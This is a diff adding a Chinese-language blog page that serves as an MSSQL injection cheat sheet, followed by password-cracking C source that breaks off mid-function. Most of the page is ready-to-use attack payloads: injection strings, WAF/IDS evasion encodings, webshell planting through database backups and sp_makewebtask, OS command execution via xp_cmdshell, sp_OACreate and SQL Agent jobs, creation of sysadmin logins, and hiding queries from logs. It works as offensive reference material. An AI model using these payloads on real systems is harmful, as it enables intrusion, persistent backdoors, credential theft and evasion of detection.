@@ -1,0 +1,854 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!--
+    * Author:         Corener
+    * Revised:        Corener
+    -->
+    <meta charset="utf-8" />
+    <title>有关MsSql注入的备忘录 | Corener in Learning</title>
+    <meta name="author" content="Corener" />
+    <meta name="renderer" content="webkit">
+    <meta name="description" content="Everything about Corener" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <link rel="stylesheet" href="/css/default.css" type="text/css" />
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="alternate" type="application/atom+xml" title="Recent Entries" href="/atom.xml" />
+    <script src="/js/jquery-1.7.1.min.js" type="text/javascript"></script>
+</head>
+<body>
+
+    <div class="home-menu">
+        <div class="home-icon-con">
+            <a class="home-menu-icon" href="/">Corener</a>
+            <a class="home-follow" href="#" title="Contact Me">+</a>
+        </div>
+        <div class="home-contact">
+            <a href="https://github.com/Corener/" target="_blank" style="margin-left:-5px;"><img src="https://github.com/favicon.ico" alt="" width="22"/></a>
+            <a href="http://www.douban.com/people/Corenerindouban/" target="_blank" style="text-align:center;"><img src="http://www.douban.com/favicon.ico" alt="" width="22"/></a>
+            <a href="http://www.zhihu.com/people/Corenerinzhihu" target="_blank" style="text-align:right"><img src="http://www.zhihu.com/favicon.ico" alt="" width="22"/></a>
+        </div>
+    </div>
+
+    <link rel="stylesheet" href="/js/prettify/prettify.css" />
+<style type="text/css">
+    body { background:#e8e8e8; }
+    @media screen and (max-width: 750px){
+        body { background:#fff; }
+    }
+    @media screen and (max-width: 1020px){
+        body { background:#fff; }
+    }
+</style>
+
+<div id="content">
+    <div class="entry">
+        <h1 class="entry-title"><a href="/MsSql_wiki" title="有关MsSql注入的备忘录">有关MsSql注入的备忘录</a></h1>
+        <p class="entry-date">2017-12-04</p>
+        <p>作者： <a href="http://corener.github.io/">corener</a></p>
+
+<hr />
+
+<p>总结一下MsSql注入的知识，作为一个备忘录，一部分摘抄自互联网…</p>
+
+<h3 id="mssql注入知识库">MSSQL注入知识库</h3>
+
+<h4 id="默认数据库">默认数据库</h4>
+<pre><code class="language-sh">pubs	不适用于MSSQL 2005
+model	适用于所有版本
+msdb	适用于所有版本
+tempdb	适用于所有版本
+northwind	适用于所有版本
+information_schema	适用于MSSQL 2000及更高版本
+</code></pre>
+
+<h4 id="注释掉查询">注释掉查询</h4>
+
+<p>下面可以用来注释掉你注射后查询的其余部分：</p>
+<pre><code class="language-sh">/ *	C语言风格注释
+--	SQL注释
+; 00％	空字节
+</code></pre>
+<p>示例：</p>
+<pre><code class="language-sh">SELECT * FROM Users WHERE username = '' OR 1=1 --' AND password = '';
+SELECT * FROM Users WHERE id = '' UNION SELECT 1, 2, 3/*';
+</code></pre>
+
+<h5 id="测试版本">测试版本：</h5>
+<pre><code class="language-sh">@@VERSION
+</code></pre>
+<p>示例：</p>
+<pre><code class="language-sh">如果MSSQL的版本是2008
+SELECT * FROM Users WHERE id = '1' AND @@VERSION LIKE '%2008%';
+</code></pre>
+<p>附：输出结果包含Windows操作系统的版本。</p>
+
+<h4 id="数据库凭据">数据库凭据</h4>
+<pre><code class="language-sh">数据库表	master..syslogins, master..sysprocesses
+列名	name, loginame
+当前用户	user, system_user, suser_sname(), is_srvrolemember('sysadmin')
+数据库凭据	SELECT user, password FROM master.dbo.sysxlogins
+</code></pre>
+<p>示例：</p>
+<pre><code class="language-sh">返回当前用户：
+SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID;
+检查用户是否为admin：
+SELECT (CASE WHEN (IS_SRVROLEMEMBER('sysadmin')=1) THEN '1' ELSE '0' END);
+</code></pre>
+<h4 id="数据库名称">数据库名称</h4>
+<pre><code class="language-sh">数据库表	master..sysdatabases
+列	name
+当前前数据库	DB_NAME(5)
+</code></pre>
+<p>示例：</p>
+<pre><code class="language-sh">SELECT **DB_NAME(5)**;
+SELECT** name** FROM **master..sysdatabases**;
+</code></pre>
+<h4 id="服务器主机名">服务器主机名</h4>
+<pre><code class="language-sh">@@SERVERNAME
+SERVERPROPERTY()
+host_name()
+</code></pre>
+<p>示例：</p>
+<pre><code class="language-sh">SELECT SERVERPROPERTY('productversion'), SERVERPROPERTY('productlevel'), SERVERPROPERTY('edition');
+</code></pre>
+<p>附：</p>
+<pre><code class="language-sh">SERVERPROPERTY()    适用于MSSQL 2000及更高版本。
+</code></pre>
+<h4 id="表和列">表和列</h4>
+<ul>
+  <li>确定列数</li>
+</ul>
+
+<pre><code class="language-sh">ORDER BY n+1;
+</code></pre>
+<ul>
+  <li>示例： 查询语句:</li>
+</ul>
+
+<pre><code class="language-sh">SELECT username, password, permission FROM Users WHERE id = '1';
+1' ORDER BY 1--	True
+1' ORDER BY 2--	True
+1' ORDER BY 3--	True
+1' ORDER BY 4--	False - 列数为3
+-1' UNION SELECT 1,2,3--	True
+附： 不断递增的列数，直到得到一个错误的响应。
+</code></pre>
+
+<h4 id="group-by--having-获取当前查询的列名">GROUP BY / HAVING 获取当前查询的列名</h4>
+<p>示例： 给出的查询：</p>
+<pre><code class="language-sh">SELECT username, password, permission FROM Users WHERE id = '1';
+1' HAVING 1=1--	选择列表中的列 'Users.username' 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。
+1' GROUP BY username HAVING 1=1--	True
+选择列表中的列 'Users.username' 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。	True
+1' GROUP BY username, password HAVING 1=1--	选择列表中的列 'Users.username' 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。
+1' GROUP BY username, password, permission HAVING 1=1--	没有错误
+</code></pre>
+<p>附：一旦匹配所有的列将返回正常请求页面.</p>
+
+<h4 id="检索表">检索表</h4>
+
+<p>我们可以从两个不同的数据库，information_schema.tables 或 from master..sysobjects 中检索表。</p>
+
+<h4 id="联合查询">联合查询:</h4>
+<pre><code class="language-sh">UNION SELECT name FROM master..sysobjects WHERE xtype='U'
+</code></pre>
+<p>附：</p>
+<pre><code class="language-sh">U = 用户表, V = 视图 , X = 扩展存储过程
+</code></pre>
+<h4 id="盲注类型">盲注类型：</h4>
+<pre><code class="language-sh">AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables &gt; 'A'
+</code></pre>
+<h4 id="报错类型">报错类型:</h4>
+<pre><code class="language-sh">AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables)
+AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables))
+</code></pre>
+<h4 id="检索列">检索列</h4>
+<p>我们可以从两个不同的数据库，information_schema.columns 或 masters..syscolumns中检索列。</p>
+
+<h4 id="联合查询-1">联合查询:</h4>
+<pre><code class="language-sh">UNION SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = 'tablename')
+</code></pre>
+
+<h4 id="盲注类型-1">盲注类型:</h4>
+<pre><code class="language-sh">AND SELECT SUBSTRING(column_name,1,1) FROM information_schema.columns &gt; 'A'
+</code></pre>
+<h4 id="报错类型-1">报错类型:</h4>
+<pre><code class="language-sh">AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns)
+AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns WHERE column_name NOT IN(SELECT TOP 1 column_name FROM information_schema.columns))
+</code></pre>
+<h4 id="一次性检索多个表">一次性检索多个表</h4>
+<p>下面的3个查询将创建一个临时表/列 并插入所有用户定义的表，然后把表的内容进行转储并删除</p>
+
+<ul>
+  <li>创建临时表/列和插入数据：</li>
+</ul>
+
+<pre><code class="language-sh">AND 1=0; BEGIN DECLARE @xy varchar(8000) SET @xy=':' SELECT @xy=@xy+' '+name FROM sysobjects WHERE xtype='U' AND name&gt;@xy SELECT @xy AS xy INTO TMP_DB END;
+</code></pre>
+
+<ul>
+  <li>转储内容：</li>
+</ul>
+
+<pre><code class="language-sh">AND 1=(SELECT TOP 1 SUBSTRING(xy,1,353) FROM TMP_DB);
+</code></pre>
+
+<ul>
+  <li>删除表：</li>
+</ul>
+
+<pre><code class="language-sh">AND 1=0; DROP TABLE TMP_DB;
+</code></pre>
+
+<ul>
+  <li>MSSQL2005及更高版本中使用xml for path 函数作为连接符，可一次性查询所有表。</li>
+</ul>
+
+<pre><code class="language-sh">SELECT table_name %2b ', ' FROM information_schema.tables FOR XML PATH('')        SQL Server 2005+
+</code></pre>
+<p>附： 代码可以用十六进制进行混淆</p>
+<pre><code>' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x44524f50205441424c4520544d505f44423b AS VARCHAR(4000)); EXEC (@S);--
+</code></pre>
+
+<ul>
+  <li>避免引用序号</li>
+</ul>
+
+<pre><code class="language-sj">SELECT * FROM Users WHERE username = CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110)
+</code></pre>
+
+<ul>
+  <li>字符串连接</li>
+</ul>
+
+<pre><code class="language-sh">SELECT CONCAT('a','a','a'); (SQL SERVER 2012)
+SELECT 'a'+'d'+'mi'+'n';
+</code></pre>
+
+<h4 id="条件语句">条件语句</h4>
+<pre><code class="language-sh">IF
+CASE
+</code></pre>
+<p>示例：</p>
+<pre><code class="language-sh">IF 1=1 SELECT 'true' ELSE SELECT 'false';
+SELECT CASE WHEN 1=1 THEN true ELSE false END;
+</code></pre>
+<p>附：IF不能在SELECT语句中使用。</p>
+
+<h4 id="时间延迟">时间延迟:</h4>
+<pre><code class="language-sh">WAITFOR DELAY 'time_to_pass';
+WAITFOR TIME 'time_to_execute';
+</code></pre>
+<p>示例：</p>
+<pre><code class="language-sh">IF 1=1 WAITFOR DELAY '`:0:5' ELSE WAITFOR DELAY '0:0:0';
+</code></pre>
+<h4 id="openrowset攻击">OPENROWSET攻击</h4>
+<p>OPENROWSET用法：<a href="http://www.cnblogs.com/OpenCoder/archive/2010/03/18/1689321.html">http://www.cnblogs.com/OpenCoder/archive/2010/03/18/1689321.html</a>
+//测试出网，vps上开1433端口监听</p>
+<pre><code class="language-sh">SELECT * FROM OPENROWSET('SQLOLEDB', '127.0.0.1';'sa';'p4ssw0rd', 'SET FMTONLY OFF execute master..xp_cmdshell "dir"');
+</code></pre>
+<p>OPENROWSET 在MSSQL 2005及以上版本中默认是禁用的.</p>
+
+<ul>
+  <li>激活OPENROWSET的语句：</li>
+</ul>
+
+<pre><code class="language-sh">exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;
+</code></pre>
+
+<ul>
+  <li>关闭OPENROWSET的语句：</li>
+</ul>
+
+<pre><code class="language-sh">exec sp_configure 'show advanced options', 0;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',0;RECONFIGURE;
+</code></pre>
+
+<h4 id="添加数据库用户">添加数据库用户</h4>
+<pre><code class="language-sh">exec sp_addlogin 'name' , 'password'
+exec sp_addsrvrolemember 'name' , 'sysadmin'       加为数据库管理员
+</code></pre>
+
+<ul>
+  <li>修改sa用户密码</li>
+</ul>
+
+<pre><code class="language-sh">EXEC sp_password NULL,'NewPassword','sa'           (适用于SQL2000及以上)
+alter login [sa] with password=N'NewPassword'      (适用于SQL2005及以上)
+;exec master.dbo.sp_password null,username,password;-- 
+</code></pre>
+
+<h4 id="get-webshell">Get WebShell</h4>
+
+<p>差异备份: 创建差异数据库备份需要有以前的完整数据库备份。 如果选定的数据库从未进行过备份，则请在创建任何差异备份之前，先执行完整数据库备份。</p>
+
+<ul>
+  <li>方法1</li>
+</ul>
+
+<pre><code class="language-sh">backup database 库名 to disk = 'c:\tmp.bak';create table [dbo].[test_tmp] ([cmd] [image]);insert into  test_tmp(cmd) values(0x3C25657865637574652872657175657374282261222929253E);backup database 库名 to disk='c:\shell.asp' WITH DIFFERENTIAL,FORMAT;
+</code></pre>
+
+<ul>
+  <li>方法2 (减小体积)</li>
+</ul>
+
+<pre><code class="language-sh">alter database web1 set RECOVERY FULL;create table  test_tmp  (a image);backup log web1 to disk = 'c:\cmd' with init;insert into test_tmp (a) values (0x3C25657865637574652872657175657374282261222929253EDA);backup log web1 to disk = 'c:\shell.asp'--
+</code></pre>
+<pre><code class="language-sh">*0x3C25657865637574652872657175657374282261222929253E = &lt;%execute(request("a"))%&gt;
+</code></pre>
+
+<h4 id="sp_makewebtask-备份需sa权限">sp_makewebtask 备份(需sa权限)</h4>
+<pre><code class="language-sh">exec sp_makewebtask 'c:\shell.asp',' select ''&lt;%25execute(request("a"))%25&gt;'' ';
+</code></pre>
+<p>注：sp_makewebtask存储过程在MSSQL 2005及以上版本中默认是禁用的</p>
+
+<ul>
+  <li>激活 sp_makewebtask存储过程的语句:</li>
+</ul>
+
+<pre><code class="language-sh">exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Web Assistant Procedures',1;RECONFIGURE;  
+</code></pre>
+
+<h4 id="系统命令执行">系统命令执行</h4>
+
+<h5 id="1-使用xp_cmdshell存储过程执行操作系统命令">1. 使用xp_cmdshell存储过程执行操作系统命令。</h5>
+
+<p>xp_cmdshell 存储过程在MSSQL 2005及以上版本中默认是禁用的.</p>
+<pre><code class="language-sh">EXEC master.dbo.xp_cmdshell 'cmd';
+</code></pre>
+
+<ul>
+  <li>激活 xp_cmdshell 存储过程的语句:</li>
+</ul>
+
+<pre><code class="language-sh">EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
+</code></pre>
+<p>检查是否xp_cmdshell是否加载，如果是,将继续检查是否处于活动状态，然后继续执行“DIR”命令并将结果插入到TMP_DB表中：</p>
+
+<ul>
+  <li>示例：</li>
+</ul>
+
+<pre><code class="language-sh">' IF EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='TMP_DB') DROP TABLE TMP_DB DECLARE @a varchar(8000) IF EXISTS(SELECT * FROM dbo.sysobjects WHERE id = object_id (N'[dbo].[xp_cmdshell]') AND OBJECTPROPERTY (id, N'IsExtendedProc') = 1) BEGIN CREATE TABLE %23xp_cmdshell (name nvarchar(11), min int, max int, config_value int, run_value int) INSERT %23xp_cmdshell EXEC master..sp_configure 'xp_cmdshell' IF EXISTS (SELECT * FROM %23xp_cmdshell WHERE config_value=1)BEGIN CREATE TABLE %23Data (dir varchar(8000)) INSERT %23Data EXEC master..xp_cmdshell 'dir' SELECT @a='' SELECT @a=Replace(@a%2B'&lt;br&gt;&lt;/font&gt;&lt;font color="black"&gt;'%2Bdir,'&lt;dir&gt;','&lt;/font&gt;&lt;font color="orange"&gt;') FROM %23Data WHERE dir&gt;@a DROP TABLE %23Data END ELSE SELECT @a='xp_cmdshell not enabled' DROP TABLE %23xp_cmdshell END ELSE SELECT @a='xp_cmdshell not found' SELECT @a AS tbl INTO TMP_DB--
+</code></pre>
+
+<ul>
+  <li>转储内容:</li>
+</ul>
+
+<pre><code class="language-sh">' UNION SELECT tbl FROM TMP_DB--
+</code></pre>
+
+<ul>
+  <li>删除表:</li>
+</ul>
+
+<pre><code class="language-sh">' DROP TABLE TMP_DB--
+</code></pre>
+
+<h5 id="2利用sp_oacreate和sp_oamethod调用控件执行系统命令">2.利用sp_OACREATE和sp_OAMethod调用控件执行系统命令:</h5>
+
+<p>sp_oacreate 存储过程在MSSQL 2005及以上版本中默认是禁用的.</p>
+<pre><code class="language-sh">DECLARE @execmd INT EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe [[/c]]   ver &gt;C:\inetpub\wwwroot\test.txt'
+</code></pre>
+
+<ul>
+  <li>激活 sp_oacreate 存储过程的语句:</li>
+</ul>
+
+<pre><code class="language-sh">exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;
+</code></pre>
+<p>附:SQL Server 提供了sp_OACREATE和sp_OAMethod函数,可以利用这两个函数调用OLE控件，间接获取一个shell。使用SP_OAcreate调用对象wscript。shell赋给变量@shell，然后使用SP_OAMETHOD调用@shell的属性run执行命令。</p>
+
+<h5 id="3jet-沙盒模式执行系统命令sandbox-mode">3.JET 沙盒模式执行系统命令(Sandbox Mode)</h5>
+
+<p>在默认情况下Jet数据引擎不支持select shell(“net user “)这样的SQL语句，必须开启JET引擎的沙盒模式才能执行命令，先利用xp_regwrite存储过程改写注册表，然后利用OpenRowSet访问一个ACCESS数据库文件，再执行运行命令的SQL语句。</p>
+
+<ul>
+  <li>
+    <p>激活沙盒模式:</p>
+  </li>
+  <li>
+    <p>Windows 2003</p>
+  </li>
+</ul>
+
+<pre><code class="language-sh">exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;--
+</code></pre>
+
+<ul>
+  <li>Windows 2008 R2</li>
+</ul>
+
+<pre><code class="language-sh">exec  master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Wow6432Node\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0; 
+</code></pre>
+
+<ul>
+  <li>Windows 2003 + SQL Server2000 沙盒模式执行命令的语句:</li>
+</ul>
+
+<p>（Windows 2003 系统c:\windows\system32\ias\目录下默认自带了2个Access数据库文件ias.mdb/dnary.mdb,所以直接调用即可.）</p>
+<pre><code class="language-sh">select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net user  &gt;c:\test.txt ")');
+</code></pre>
+
+<ul>
+  <li>Windows 2008 R2+SQL Server2005 沙盒模式执行命令的语句:</li>
+</ul>
+
+<p>（ Windows 2008 R2 默认无Access数据库文件,需要自己上传,或者用UNC路径加载文件方能执行命令.）</p>
+<pre><code class="language-sh">select * from openrowset('microsoft.jet.oledb.4.0',';database=\\192.168.1.8\file\ias.mdb','select shell("c:\windows\system32\cmd.exe /c net user  &gt;c:\test.txt ")');
+</code></pre>
+<p>（ SQL Server2008 默认未注册microsoft.jet.oledb.4.0接口,所以无法利用沙盒模式执行系统命令.）</p>
+
+<h5 id="4openrowset调用xp_cmdshell-执行系统命令">4.OPENROWSET调用xp_cmdshell 执行系统命令:</h5>
+
+<p>（在知道sa权限帐号密码情况下,db_owner或者public的数据库权限使用OPENROWSET调用xp_cmdshell 执行系统命令.）//这里可以测试外连，也可以用于本地的命令执行（本地执行，需要数据库用户名密码·）</p>
+<pre><code class="language-sh">SELECT * FROM OPENROWSET('SQLOLEDB', '127.0.0.1';'sa';'p4ssw0rd', 'SET FMTONLY OFF execute master..xp_cmdshell "ver"');
+</code></pre>
+<h5 id="小技巧">小技巧:</h5>
+
+<ul>
+  <li>使用 for xml 实现执行内容回显:</li>
+</ul>
+
+<pre><code class="language-sh">for xml raw/auto	适用于SQL Server 2000及以上版本 **(**附**:此法只能取首行数据,问题待解决.)**
+or 1 in(SELECT * FROM OPENROWSET('SQLOLEDB', 'trusted_connection=yes', 'SET FMTONLY OFF execute master..xp_cmdshell "set"'))for xml raw
+or 1 in(SELECT * FROM OPENROWSET('SQLOLEDB', 'trusted_connection=yes', 'SET FMTONLY OFF execute master..xp_cmdshell "set"'))for xml auto
+</code></pre>
+
+<ul>
+  <li>for xml path	适用于SQL Server 2005及以上版本,虽然是一次性获取所有内容,但是取出内容数量取决于表定义的长度.</li>
+</ul>
+
+<pre><code class="language-sh">SELECT * FROM OPENROWSET('SQLOLEDB', 'trusted_connection=yes', 'SET FMTONLY OFF execute master..xp_cmdshell "ver"') for xml path  
+SELECT * FROM OPENROWSET('SQLOLEDB', '192.168.1.117';'sa';'123456', 'SET FMTONLY OFF execute master..xp_cmdshell "ver"')for xml path
+</code></pre>
+<p>附:
+回显内容超过表定义长度将会出现内容为 “将截断字符串或二进制数据。”的错误</p>
+
+<h5 id="5sql代理执行系统命令sqlserveragent">5.SQL代理执行系统命令(SQLSERVERAGENT):</h5>
+
+<p>（SQLSERVERAGENT服务默认是禁用的,先利用xp_servicecontrol激活SQLSERVERAGENT，然后建立一个SQL计划任务马上运行这个SQL任务实现命令执行。）</p>
+<pre><code class="language-sh">use msdb exec sp_delete_job null,'x';exec sp_add_job 'x';exec sp_add_jobstep Null,'x',Null,'1','CMDEXEC','cmd /c  net start &gt;C:\test.txt';exec sp_add_jobserver Null,'x',@@servername exec sp_start_job 'x';
+</code></pre>
+
+<ul>
+  <li>激活SQLSERVERAGENT的语句:</li>
+</ul>
+
+<pre><code class="language-sh">exec master.dbo.xp_servicecontrol 'start','SQLSERVERAGENT'
+</code></pre>
+
+<h4 id="其他获取系统信息的函数">其他获取系统信息的函数</h4>
+
+<ul>
+  <li>1.历遍目录</li>
+</ul>
+
+<pre><code class="language-sh">exec master.dbo.xp_dirtree 'c:\'
+</code></pre>
+
+<ul>
+  <li>2.获取子目录</li>
+</ul>
+
+<pre><code class="language-sh">exec master.dbo.xp_subdirs 'c:\'
+</code></pre>
+
+<ul>
+  <li>3.列举可用的系统分区</li>
+</ul>
+
+<pre><code class="language-sh">exec master.dbo.xp_availablemedia
+</code></pre>
+
+<ul>
+  <li>4.判断目录或文件是否存在</li>
+</ul>
+
+<pre><code class="language-sh">exec master..xp_fileexist 'c:\boot.ini'
+</code></pre>
+
+<h4 id="sp_password-隐藏查询">SP_PASSWORD （隐藏查询）</h4>
+
+<p>在查询结束后追加sp_password,T-SQL日志作为一项安全措施隐藏它。</p>
+
+<h4 id="sp_password">SP_PASSWORD</h4>
+
+<p>Example:</p>
+<pre><code class="language-sh">' AND 1=1--sp_password
+</code></pre>
+<p>输出：</p>
+<pre><code class="language-sh">-- 'sp_password的'在该事件文本中被发现。('sp_password' was found in the text of this event.)
+-- 出于安全原因,该文本已被替换成注释。( The text has been replaced with this comment for security reasons.)
+</code></pre>
+<p>这个方法不理解,望小伙伴们解答.</p>
+<h4 id="层叠查询">层叠查询</h4>
+
+<ul>
+  <li>（ MSSQL支持 层叠查询）</li>
+</ul>
+
+<p>示例：</p>
+<pre><code class="language-sh">' AND 1=0 INSERT INTO ([column1], [column2]) VALUES ('value1', 'value2');
+</code></pre>
+
+<h4 id="模糊测试和混淆">模糊测试和混淆</h4>
+<p>允许中间字符
+以下字符可以作为空格符。
+01、02、03、04、05、06、07、08、09、0A、0B、0C、0D、0E、0F、10、11、12、13、14、15、16、17、18、19、1A、1B、1C、1D、1E、1F、20、25</p>
+
+<ul>
+  <li>示例：</li>
+</ul>
+
+<pre><code class="language-sh">S%E%L%E%C%T%01column%02FROM%03table;
+A%%ND 1=%%%%%%%%1;
+</code></pre>
+<p>附： 关键词之间的百分比符号只在ASP(X)的Web应用程序中有效。</p>
+
+<ul>
+  <li>下面的字符也可用来避免空格。</li>
+</ul>
+
+<pre><code class="language-sh">22    "
+28   （
+29    ）
+5B    [
+5D    ]
+</code></pre>
+
+<ul>
+  <li>示例：</li>
+</ul>
+
+<pre><code class="language-sh">UNION(SELECT(column)FROM(table));
+SELECT"table_name"FROM[information_schema].[tables];
+</code></pre>
+
+<ul>
+  <li>AND/OR可以使用中间符号:</li>
+</ul>
+
+<pre><code class="language-sh">01 - 20 范围
+21  !
+2B  +
+2D  -
+2E  .
+5C  \
+7E  ~
+</code></pre>
+
+<ul>
+  <li>示例：</li>
+</ul>
+
+<pre><code class="language-sh">SELECT 1FROM[table]WHERE\1=\1AND\1=\1;
+</code></pre>
+<p>附： 反斜杠似乎不适用于MSSQL 2000中.</p>
+
+<h4 id="编码">编码</h4>
+
+<p>编码注射语句，有利于躲避WAF / IDS检查。</p>
+<pre><code class="language-sh">URL编码(URL Encoding)
+            SELECT %74able_%6eame FROM information_schema.tables;
+双重URL编码(Double URL Encoding)
+            SELECT %2574able_%256eame FROM information_schema.tables;
+Unicode编码(Unicode Encoding)
+            SELECT %u0074able_%u6eame FROM information_schema.tables;
+无效的十六进制编码(Invalid Hex Encoding (ASP)
+            SELECT %tab%le_%na%me FROM information_schema.tables;
+十六进制编码(Hex Encoding)
+ ' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x53454c4543542031 AS VARCHAR(4000)); EXEC (@S);--
+HTML实体(HTML Entities 待验证)
+  %26%2365%3B%26%2378%3B%26%2368%3B%26%2332%3B%26%2349%3B%26%2361%3B%26%2349%3B
+</code></pre>
+<h4 id="密码散列">密码散列</h4>
+
+<p>从0x0100密码开始，0x 后的第一个字节是一个常数,接下来的八个字节是哈希盐,剩下的80个字节是两个散列，第一40个字节是区分大小写的密码哈希值，而第二个40字节为大写形式密码哈希值。</p>
+<pre><code class="language-sh">0x0100236A261CE12AB57BA22A7F44CE3B780E52098378B65852892EEE91C0784B911D76BF4EB124550ACABDFD1457
+</code></pre>
+<h4 id="密码破解">密码破解</h4>
+
+<p>可以利用Metasploit的JTR模块进行破解
+<a href="http://www.rapid7.com/db/modules/auxiliary/analyze/jtr_mssql_fast">http://www.rapid7.com/db/modules/auxiliary/analyze/jtr_mssql_fast</a></p>
+
+<h4 id="mssql-2000密码破解">MSSQL 2000密码破解</h4>
+
+<p>（此工具用于破解微软的SQL Server 2000的密码。）</p>
+<pre><code class="language-sh">#!cpp
+/////////////////////////////////////////////////////////////////////////////////
+//
+//           SQLCrackCl
+//
+//           This will perform a dictionary attack against the
+//           upper-cased hash for a password. Once this
+//           has been discovered try all case variant to work
+//           out the case sensitive password.
+//
+//           This code was written by David Litchfield to
+//           demonstrate how Microsoft SQL Server 2000
+//           passwords can be attacked. This can be
+//           optimized considerably by not using the CryptoAPI.
+//
+//           (Compile with VC++ and link with advapi32.lib
+//           Ensure the Platform SDK has been installed, too!)
+//
+//////////////////////////////////////////////////////////////////////////////////
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;wincrypt.h&gt;
+FILE *fd=NULL;
+char *lerr = "\nLength Error!\n";
+int wd=0;
+int OpenPasswordFile(char *pwdfile);
+int CrackPassword(char *hash);
+int main(int argc, char *argv[])
+{
+             int err = 0;
+        if(argc !=3)
+                  {
+                            printf("\n\n*** SQLCrack *** \n\n");
+                            printf("C:\\&gt;%s hash passwd-file\n\n",argv[0]);
+                            printf("David Litchfield (david@ngssoftware.com)\n");
+                            printf("24th June 2002\n");
+                            return 0;
+                  }
+        err = OpenPasswordFile(argv[2]);
+        if(err !=0)
+         {
+           return printf("\nThere was an error opening the password file %s\n",argv[2]);
+         }
+        err = CrackPassword(argv[1]);
+        fclose(fd);
+        printf("\n\n%d",wd);
+        return 0;
+}
+int OpenPasswordFile(char *pwdfile)
+{
+        fd = fopen(pwdfile,"r");
+        if(fd)
+                  return 0;
+        else
+                  return 1;
+}
+int CrackPassword(char *hash)
+{
+        char phash[100]="";
+        char pheader[8]="";
+        char pkey[12]="";
+        char pnorm[44]="";
+        char pucase[44]="";
+        char pucfirst[8]="";
+        char wttf[44]="";
+        char uwttf[100]="";
+        char *wp=NULL;
+        char *ptr=NULL;
+        int cnt = 0;
+        int count = 0;
+        unsigned int key=0;
+        unsigned int t=0;
+        unsigned int address = 0;
+        unsigned char cmp=0;
+        unsigned char x=0;
+        HCRYPTPROV hProv=0;
+        HCRYPTHASH hHash;
+DWORD hl=100;
+unsigned char szhash[100]="";
+int len=0;
+if(strlen(hash) !=94)
+          {
+                  return printf("\nThe password hash is too short!\n");
+          }
+if(hash[0]==0x30 &amp;&amp; (hash[1]== 'x' || hash[1] == 'X'))
+          {
+                  hash = hash + 2;
+                  strncpy(pheader,hash,4);
+                  printf("\nHeader\t\t: %s",pheader);
+                  if(strlen(pheader)!=4)
+                            return printf("%s",lerr);
+                  hash = hash + 4;
+                  strncpy(pkey,hash,8);
+                  printf("\nRand key\t: %s",pkey);
+                  if(strlen(pkey)!=8)
+                            return printf("%s",lerr);
+                  hash = hash + 8;
+                  strncpy(pnorm,hash,40);
+                  printf("\nNormal\t\t: %s",pnorm);
+                  if(strlen(pnorm)!=40)
+                            return printf("%s",lerr);
+                  hash = hash + 40;
+                  strncpy(pucase,hash,40);
+                  printf("\nUpper Case\t: %s",pucase);
+                  if(strlen(pucase)!=40)
+                            return printf("%s",lerr);
+                  strncpy(pucfirst,pucase,2);
+                  sscanf(pucfirst,"%x",&amp;cmp);
+          }
+else
+          {
+                  return printf("The password hash has an invalid format!\n");
+          }
+printf("\n\n       Trying...\n");
+if(!CryptAcquireContextW(&amp;hProv, NULL , NULL , PROV_RSA_FULL                 ,0))
+  {
+          if(GetLastError()==NTE_BAD_KEYSET)
+                  {
+                            // KeySet does not exist. So create a new keyset
+                            if(!CryptAcquireContext(&amp;hProv,
+                                                 NULL,
+                                                 NULL,
+                                                 PROV_RSA_FULL,
+                                                 CRYPT_NEWKEYSET ))
+                               {
+                                        printf("FAILLLLLLL!!!");
+                                        return FALSE;
+                               }
+           }
+}
+while(1)
+         {
+           // get a word to try from the file
+           ZeroMemory(wttf,44);
+           if(!fgets(wttf,40,fd))
+              return printf("\nEnd of password file. Didn't find the password.\n");
+           wd++;
+           len = strlen(wttf);
+           wttf[len-1]=0x00;
+           ZeroMemory(uwttf,84);
+           // Convert the word to UNICODE
+           while(count &lt; len)
+                     {
+                               uwttf[cnt]=wttf[count];
+                               cnt++;
+                               uwttf[cnt]=0x00;
+                               count++;
+                               cnt++;
+                     }
+           len --;
+           wp = &amp;uwttf;
+           sscanf(pkey,"%x",&amp;key);
+           cnt = cnt - 2;
+           // Append the random stuff to the end of
+           // the uppercase unicode password
+           t = key &gt;&gt; 24;
+           x = (unsigned char) t;
+           uwttf[cnt]=x;
+           cnt++;
+           t = key &lt;&lt; 8;
+           t = t &gt;&gt; 24;
+         x = (unsigned char) t;
+         uwttf[cnt]=x;
+         cnt++;
+         t = key &lt;&lt; 16;
+         t = t &gt;&gt; 24;
+         x = (unsigned char) t;
